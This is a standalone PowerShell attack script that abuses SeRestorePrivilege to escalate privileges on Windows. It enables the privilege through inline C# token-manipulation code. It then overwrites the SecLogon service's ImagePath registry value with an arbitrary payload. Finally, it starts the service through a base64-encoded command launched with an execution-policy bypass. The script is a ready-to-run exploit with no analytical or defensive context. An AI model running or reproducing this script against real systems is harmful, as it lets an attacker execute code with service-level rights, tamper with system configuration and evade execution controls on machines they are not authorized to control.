param (
    [string]$payload
)

if (-not $payload) {
    Write-Host "Usage: .\SeRestoreAbuse.ps1 <payload>"
    exit
}

# Enable SeRestorePrivilege
$privilege = 'SeRestorePrivilege'
$definition = @"
using System;
using System.Runtime.InteropServices;
public class TokenManipulator {
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
        ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
    [DllImport("kernel32.dll", ExactSpelling = true)]
    internal static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
    internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok);
    [DllImport("advapi32.dll", SetLastError = true)]
    internal static extern bool LookupPrivilegeValue(string host, string name, ref long pluid);
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    internal struct TokPriv1Luid {
        public int Count;
        public long Luid;
        public int Attr;
    }
    internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
    internal const int TOKEN_QUERY = 0x00000008;
    internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;
    public static bool AddPrivilege(string privilege) {
        try {
            bool retVal;
            TokPriv1Luid tp;
            IntPtr hproc = GetCurrentProcess();
            IntPtr htok = IntPtr.Zero;
            retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
            tp.Count = 1;
            tp.Luid = 0;
            tp.Attr = SE_PRIVILEGE_ENABLED;
            retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
            retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
            return retVal;
        } catch (Exception ex) {
            throw new Exception("Failed to adjust token privileges", ex);
        }
    }
}
"@
Add-Type -TypeDefinition $definition
[TokenManipulator]::AddPrivilege($privilege)

# Create or open the registry key
$keyPath = 'SYSTEM\CurrentControlSet\Services\SecLogon'
$key = [Microsoft.Win32.Registry]::LocalMachine.CreateSubKey($keyPath, [Microsoft.Win32.RegistryKeyPermissionCheck]::ReadWriteSubTree)

# Set the ImagePath value
$key.SetValue('ImagePath', $payload)

# Start the service
Invoke-Expression -Command "powershell -exec bypass -enc ZwBlAHQALQBzAGUAcgB2AGkAYwBlACAAcwBlAGMAbABvAGcAbwBuACAAfAAgAHMAdABhAHIAdAAtAHMAZQByAHYAaQBjAGUA"
